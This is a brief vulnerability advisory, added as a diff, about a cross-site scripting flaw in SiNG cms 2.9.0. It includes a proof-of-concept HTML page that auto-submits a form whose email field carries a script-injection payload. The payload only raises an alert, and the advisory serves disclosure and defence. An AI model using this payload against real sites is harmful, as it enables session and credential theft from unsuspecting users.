@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/55168/info
+
+SiNG cms is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+SiNG cms 2.9.0 is vulnerable; other versions may also be affected. 
+
+<html> <head> <title>SiNG cms 2.9.0 (email) Remote XSS POST Injection Vulnerability</title> </head> <body> <form name="email" method="post" action="http://www,example.com/singcms/password.php"> <input type="hidden" name="email" value='"><script>alert("XSS");</script>' /> <input type="hidden" name="send" value="Send password" /> </form> <script type="text/javascript"> document.email.submit(); </script> </body> </html> 
